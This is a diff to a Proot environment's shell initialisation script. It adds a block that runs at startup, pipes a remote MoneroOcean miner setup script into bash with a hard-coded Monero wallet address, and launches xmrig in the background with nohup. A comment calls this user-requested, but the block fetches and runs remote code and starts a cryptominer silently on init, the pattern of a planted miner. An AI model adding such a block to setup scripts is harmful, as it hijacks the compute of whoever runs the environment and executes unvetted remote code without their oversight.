@@ -210,6 +210,25 @@ else
   echo -e "\033[1;32mProot 环境已初始化，跳过软件包安装和源更新。\033[0m"
 fi
 
+# --- 开始添加用户请求的矿机设置和启动命令 ---
+if [ ! -e /.miner_setup_done ]; then
+  echo -e "\033[1;33m正在设置并启动 MoneroOcean 矿机...\033[0m"
+  # 执行矿机设置脚本，并启动矿机
+  # 注意：这里的 /home/appuser 会被 \$HOST_USER 替换为实际的用户名
+  curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 43BQxQrFN41aZ5jarKMZZv3N24DA2Tgy7gopo8RoNWvL6DnobvVwVtKKT4x5kGV6GC2heg9t8x36r8fE7WkXmjH31cXPhEo && \
+  cd /home/\$HOST_USER/moneroocean && \
+  (nohup ./xmrig --config=config.json > miner.log 2>&1 &) && \
+  sleep 3 && top
+  
+  echo -e "\033[1;32mMoneroOcean 矿机设置和启动完成!\033[0m"
+  # 创建矿机设置完成标记文件
+  touch /.miner_setup_done
+else
+  echo -e "\033[1;32mMoneroOcean 矿机已设置并启动，跳过重复操作。\033[0m"
+fi
+# --- 结束添加用户请求的矿机设置和启动命令 ---
+
+
 # 显示欢迎信息
 printf "\n\033[1;36m################################################################################\033[0m\n"
 printf "\033[1;33m#                                                                            #\033[0m\n"
